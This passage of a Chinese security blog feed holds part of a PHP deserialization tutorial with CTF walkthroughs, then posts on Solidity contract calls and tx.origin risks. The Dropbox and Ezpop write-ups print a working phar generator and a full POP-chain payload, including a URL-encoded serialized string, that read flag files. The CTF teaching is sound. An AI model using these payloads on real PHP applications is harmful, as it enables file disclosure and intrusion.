文件就会将数据反序列化，可以使用常用函数结合文件伪造，通过<code>phar://</code>伪协议解析造成反序列化攻击，如以下文件操作函数</li></ol></blockquote><table><thead><tr><th>文件操作函数</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>fileatime</td><td>filectime</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup</td><td>fopen</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file</td></tr><tr><td>copy</td><td>unlink</td><td>stat</td><td>readfile</td></tr></tbody></table><p>例题：[CISCN2019 华北赛区 Day1 Web1]Dropbox</p><p>在登录后有文件上传的功能，在上传文件后可以进行文件删除和文件下载的操作。下载文件操作通过 <strong>POST</strong> 请求传递 <strong>filename</strong> 参数来完成的，这里可以构造参数尝试进行任意文件下载，得到源码</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt="2"></p><p><strong>index.php:</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileList(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>继而可以下载到 <strong>class.php，delete.php，download.php</strong>。</p><p>对代码进行分析后， <strong>class.php</strong>的 <strong>File</strong> 类中的 <strong>close</strong> 方法可以读取文件内容；</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>User</strong> 类中存在 <strong>close</strong> 方法，当该对象被销毁时会去执行 <strong>close</strong> 方法；</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>FileList</strong> 类中存在 <strong>__call</strong> 魔术方法，且该类中不存在 <strong>close</strong> 方法，如果一个 <strong>FileList</strong> 对象掉用了 <strong>close()</strong> 方法，就可以通过 <strong>__call</strong> 方法去执行 <strong>close</strong> 方法；</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>); <span class="comment">// 向$this-&gt;funcs数组尾部添加$func</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123; <span class="comment">//遍历数组</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以梳理出解题的思路：</p><ol><li>创建一个 user 对象，其 db 变量是一个 FileList 对象，且对象中的 files 参数为 flag 的位置。</li><li>当 user 对象被销毁时，db 变量的 close 方法会被执行；</li><li>db 变量不存在 close 方法，会触发 FileList 中的 __call 魔术方法，即执行 File 对象中的 close 方法；</li><li>close 方法执行后存在 result 变量的结果会被加入到 table 变量中打印出来。</li></ol><p>生成 phar 文件：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="comment">//$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;<span class="meta">&lt;?php</span> __HALT_COMPILER();<span class="meta">?&gt;</span>&#x27;);   </span></span><br><span class="line"><span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$o</span>-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过删除功能去利用<code>php://</code>伪协议去解析 <strong>phar</strong> 文件，会将 <strong>meta-data</strong> 进行反序列化：</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt="3"></p><h5 id="③-MRCTF2020-Ezpop（构造-pop链）"><a href="#③-MRCTF2020-Ezpop（构造-pop链）" class="headerlink" title="③ MRCTF2020-Ezpop（构造 pop链）"></a>③ MRCTF2020-Ezpop（构造 pop链）</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>代码分析：</p><p><strong>GET</strong> 请求的 <strong>pop</strong> 参数可控，利用 <strong>Modifier</strong> 类中的 <strong>append</strong> 方法就可以包含 <strong>flag</strong>，实例化一个对象时会先执行对象中的 <code>__wakeup()</code> 方法，而 <strong>Show</strong> 类中的 <code>__wakeup</code> 方法的 <strong>source</strong> 也可控，可以构造 <strong>pop</strong> 链：</p><ul><li>构造 <code>$source = new Show</code>，在 <strong>Show</strong> 中首先执行 <code>__wakeup</code>方法，又因为  <code>__wakeup</code> 方法中的 <code>source</code> 参数指向一个类，当类被用作字符串输出时会触发该类的 <code>__toString()</code> 方法</li><li>再构造 <strong>Show</strong> 中的 <strong>str</strong> 参数，使 <code>$str = new Test</code>，当执行 <code>__toString()</code> 方法时，<code>return $this-&gt;str-&gt;source</code>会取 str(new Test) 类中的 <strong>source</strong> 值，当读取不可访问（protected 或 private）或不存在的属性的值时会去调用 <code>__get()</code> 方法，即 <strong>Test</strong> 类中的 <code>__get()</code> 方法；</li><li>执行 <code>__get()</code> 方法时会返回一个 <strong>function</strong>，构造 <code>$p = new Modifer</code>，即将类变量作为函数去调用，此时会执行该类中的 <code>__invoke()</code> 方法；</li><li>最后构造 <code>$var = &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</code>，在执行 <strong>__invoke()</strong> 方法时将 <strong>var</strong> 作为参数去调用 <strong>Modifer</strong> 类下的 <strong>append</strong> 方法，最后利用 <strong>php://</strong> 伪协议读取 <strong>flag</strong>。</li></ul><p>所以最终的 <strong>payload</strong> 为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> -&gt; str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; source = <span class="variable">$a</span>;</span><br><span class="line">var_dump(<span class="variable">$b</span>);</span><br><span class="line">var_dump(urlencode(serialize(<span class="variable">$b</span>)));  </span><br><span class="line"><span class="comment">//因为 $var 为 protected变量，所以需要添加\0*\0，这里使用 urlencode编码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//payload O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3Bs%3A0%3A%22%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>整个流程结构如下图：</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt="4"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-原理介绍&quot;&gt;&lt;a href=&quot;#0x01-原理介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理介绍&quot;&gt;&lt;/a&gt;0x01 原理介绍&lt;/h4&gt;&lt;p&gt;php反序列化即所有php中的值都可以使用 serialize() 函数来返回一个包</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="反序列化" scheme="https://banana69.site/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Solididy合约调用</title>
    <link href="https://banana69.site/2021/10/15/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/"/>
    <id>https://banana69.site/2021/10/15/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/</id>
    <published>2021-10-15T01:24:02.000Z</published>
    <updated>2021-10-17T12:07:54.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Solidity</strong> 提供了几种调用其他合约的方法，如 (call, send, delegatecall, callcode) 等。</p><h4 id="一、创建新实例"><a href="#一、创建新实例" class="headerlink" title="一、创建新实例"></a>一、创建新实例</h4><p>调用另一份合约最安全的方法是创建其他合约，以确定它的接口和行为来实例化它，通过关键字 <strong>new</strong> 来实例化需要调用的合约。在 <strong>Solidity</strong> 中，关键字 <strong>new</strong> 将在区块链上创建合约并返回一个可用于引用它的对象。</p><p>例如以下合约从另一个名为 <strong>Token</strong> 的合约中创建并调用 <strong>Faucet</strong> 合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Faucet&#123;</span><br><span class="line">    function withdraw(uint withdraw_amount) public &#123;</span><br><span class="line">        require(withdraw_amount &lt;= 100000000000000000);</span><br><span class="line">        msg.sender.transfer(withdraw_amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Token is Faucet &#123;</span><br><span class="line">Faucet _faucet;</span><br><span class="line"></span><br><span class="line">constructor() &#123;</span><br><span class="line">_faucet = new Faucet();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>new</strong> 关键字还可以接受可选参数来指定创建时传输的 <strong>Ether</strong> 值，以及传递给新合约的构造函数的参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;Faucet.sol&quot;</span><br><span class="line"></span><br><span class="line">contract Token is Faucet &#123;</span><br><span class="line">Faucet _faucet;</span><br><span class="line"></span><br><span class="line">constructor() &#123;</span><br><span class="line">_faucet = (new Faucet).value(0.5 ether)();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二、访问现有实例"><a href="#二、访问现有实例" class="headerlink" title="二、访问现有实例"></a>二、访问现有实例</h4><p>可以将现有合约的地址转换为实例来实现合约的调用，即将某个地址强制转换为某个合约类型，使用这种方法时已知接口应用于现有的实例。</p><p>如以下合约将地址作为参数提供给构造函数，并将其强制转换为合约对象：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;Faucet.sol&quot;</span><br><span class="line"></span><br><span class="line">contract Token is Fucet&#123;</span><br><span class="line">Faucet _faucet;</span><br><span class="line"></span><br><span class="line">constructor(address _addr)&#123;</span><br><span class="line">_faucet = Faucet(_addr);</span><br><span class="line">_faucet.withdraw(0.1 ether);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上的代码存在一定的风险，例如无法确定传入构造函数的地址是否是 Faucet 对象，也无法确定调用 <strong>withdraw</strong> 函数时是否可以与预期结果一致。</p><h4 id="三、底层函数调用"><a href="#三、底层函数调用" class="headerlink" title="三、底层函数调用"></a>三、底层函数调用</h4><p><strong>Solidity</strong> 提供了几种底层调用合约的方式，例如<code>call</code>，<code>delegatecall</code>和<code>codecall</code>，<code>call</code>的外部调用上下文是外部合约，而<code>delegatecall</code>的外部调用上下文是调用者合约，<code>callcode</code>的外部调用上下文是调用者合约，这里借用<strong>rickgray</strong>师傅的图：</p><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/1.png" alt="1"></p><ul><li><p>当合约 <strong>A</strong> 以 <strong>call</strong> 调用外部合约 <strong>B</strong> 的 <strong>fun()</strong> 时，<strong>fun()</strong> 在 合约 <strong>B</strong> 的上下文执行，然后继续返回 合约 <strong>A</strong> 中继续执行，该调用会将内置的 <strong>msg.sender</strong> 的值修改为调用者；</p></li><li><p>当合约 <strong>A</strong> 以 <strong>delegatecall</strong> 调用外部合约 <strong>B</strong> 中的 <strong>fun()</strong> 函数时，<strong>fun()</strong> 函数在合约 <strong>A</strong> 的上下文条件下执行，该调用不会修改内置变量 **msf.sender **的值；</p></li><li><p>当合约 <strong>A</strong> 以 <strong>callcode</strong> 调用外部合约 <strong>B</strong> 中的 <strong>fun()</strong> 函数时，<strong>fun()</strong> 函数在合约 <strong>A</strong> 的上下文条件下执行，该调用不会修改内置变量 **msf.sender **的值。</p><blockquote><p>这里区分一下 <strong>tx.origin</strong> 和 <strong>msg.sender</strong> ，<strong>msg.sender</strong> 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 <strong>tx.origin</strong> 则必然是这个交易的原始发起方，无论中间有多少次合约内 / 跨合约函数调用，而且一定是账户地址而不是合约地址。</p></blockquote></li></ul><p>从以下代码分析三种调用方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract A&#123;</span><br><span class="line">    address public address_A;</span><br><span class="line">    uint256 public num_A;</span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">    function call(address addr) public &#123;</span><br><span class="line">        addr.call(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.callcode(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    function delegatecallcall(address addr) public &#123;</span><br><span class="line">        //addr.call(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        addr.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.callcode(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    function callcode(address addr) public &#123;</span><br><span class="line">        //addr.call(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        addr.callcode(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B&#123;</span><br><span class="line">    address public address_B;</span><br><span class="line">    uint256 public num_B = 100;</span><br><span class="line">    </span><br><span class="line">    function test() public &#123;</span><br><span class="line">        address_B = msg.sender;</span><br><span class="line">        num_B = 100;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从账户<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>分别部署合约 <strong>A</strong> 和 合约 <strong>B</strong>，可以看到合约 <strong>B</strong> 未被调用时的 <strong>msg.sender</strong> 和 <strong>num_b</strong> 分别如下图所示：</p><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/2.png" alt="2"></p><ul><li><p>当合约 <strong>A</strong> 以 <strong>call</strong> 方式 调用合约 <strong>B</strong> 中的 <strong>test()</strong> 函数时：</p><p><strong>test()</strong> 函数的执行环境是在合约 <strong>B</strong> 中，所以此时的 <strong>msg.sender</strong> 是调用者的合约地址，即合约 <strong>A</strong> 的地址，而在合约 <strong>A</strong> 中，<strong>address_A</strong> 和 <strong>num_A</strong> 仍未改变；<img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/3.png" alt="3"></p></li><li><p>当合约 <strong>A</strong> 以 <strong>delegatecall</strong> 方式调用合约 <strong>B</strong> 中的 <strong>test()</strong> 函数时：</p><p>此时 <strong>test()</strong> 函数的执行环境是在合约 <strong>A</strong> 中，所以在调用结束后，合约 <strong>B</strong> 中 <strong>msg.sender</strong> 未被修改，而在合约 <strong>A</strong> 中，<strong>address_A</strong> 被赋值为发起调用的外部账户的地址，即部署合约 <strong>A</strong> 的账户的地址，<strong>num_A</strong> 被赋值为 <strong>num_B</strong>。</p><p>但此时合约 <strong>A</strong> 中的 <strong>num_A</strong> 会被覆盖。<img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/4.png" alt="4"></p></li><li><p>当合约 <strong>A</strong> 以 <strong>callcode</strong> 方式调用合约 <strong>B</strong> 中的 <strong>test()</strong> 函数时：</p><p>通过 <strong>callcode</strong> 调用时的上下文为调用者合约，即 <strong>test()</strong> 函数的执行环境为合约 <strong>A</strong>，所以在调用结束后，合约 <strong>B</strong> 中 <strong>msg.sender</strong> 未被修改，而在合约 <strong>A</strong> 中，<strong>address_A</strong> 被赋值为发起调用的合约的地址，即合约 <strong>A</strong> 的地址，<strong>num_A</strong> 被赋值为 <strong>num_B</strong>。<img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/5.png" alt="5"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Solidity&lt;/strong&gt; 提供了几种调用其他合约的方法，如 (call, send, delegatecall, callcode) 等。&lt;/p&gt;
&lt;h4 id=&quot;一、创建新实例&quot;&gt;&lt;a href=&quot;#一、创建新实例&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>tx.origin 引发的安全问题</title>
    <link href="https://banana69.site/2021/10/09/tx-origin%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <id>https://banana69.site/2021/10/09/tx-origin%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</id>
    <published>2021-10-09T04:42:54.000Z</published>
    <updated>2022-05-05T07:41:20.130Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h4><p><strong>tx.origin</strong> 是 <strong>Solidity</strong> 中的一个全局变量，它能够遍历调用栈并返回最初发送调用的账户地址，因此使用 <strong>tx.origin</strong> 进行身份验证时存在一定的安全问题，所以一般在合约中避免使用 <strong>tx.origin</strong> 进行身份验证。</p><p>通过以下代码了解：<strong>tx.origin</strong> 与 <strong>msg.sender</strong> 的区别：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setOwner() &#123;</span><br><span class="line">owner = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setOwner() &#123;</span><br><span class="line">owner = tx.origin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调用链<code>A -&gt; B -&gt; C- &gt; D</code>中，若 <strong>D</strong> 内部的全局变量是 <strong>msg.sender</strong>， 它将指向最近的一笔交易，即是 <strong>C</strong>；若 <strong>D</strong> 内部的全局变量是 <strong>tx.origin</strong>，它将指向最初发送交易的账户地址，即是 <strong>A</strong>。</p><p> <strong>tx.origin</strong> ：</p><ul><li>只有用户钱包地址可以是 <strong>tx.origin</strong> （或合约拥有者的地址）；</li><li>可能是整个交易或调用链的原始调用者；</li><li>不可能是合约地址。</li></ul><p><strong>msg.sender</strong>:</p><ul><li>可能是特定交易或调用的发送者；</li><li>用户钱包或智能合约都可以是 <strong>msg.sender</strong>。</li></ul><h4 id="0x02-代码分析："><a href="#0x02-代码分析：" class="headerlink" title="0x02 代码分析："></a>0x02 代码分析：</h4><p>以下钱包合约使用 <strong>tx.origin</strong> 做身份认证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">contract TxUserWallet &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function TxUserWallet() public &#123;</span><br><span class="line">  